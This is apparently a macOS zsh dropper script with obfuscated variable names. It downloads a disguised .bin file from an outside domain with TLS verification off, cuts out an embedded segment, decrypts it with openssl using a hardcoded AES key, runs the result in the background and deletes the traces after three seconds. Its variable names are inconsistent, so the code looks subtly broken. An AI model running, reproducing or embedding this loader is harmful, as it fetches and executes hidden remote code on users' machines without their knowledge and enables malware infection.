#!/bin/zsh
jy6cw=$(mktemp /tmp/hejjnh.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mf1fcbb8c60287ee0.bin" -o "$jy6cwz" || exit 1
qgkq96=$(stat -f %z "$jy6cwz"); mush6wj=$(( qgkq96 - 1878 - 2632 ))
tail -c +$(( 1878 + 1 )) "$jy6cwz" | head -c $mush6wj | openssl enc -d -aes-256-cbc -k a718a2fd53c6ddab8e565268 -out "$jy6cw" 2>/dev/null
[ -s "$jy6cw" ] && chmod 700 "$jy6cw" && ( "$jy6cw" & ) && disown
( sleep 3; rm -f "$jy6cw" "$jy6cwz" ) &>/dev/null &
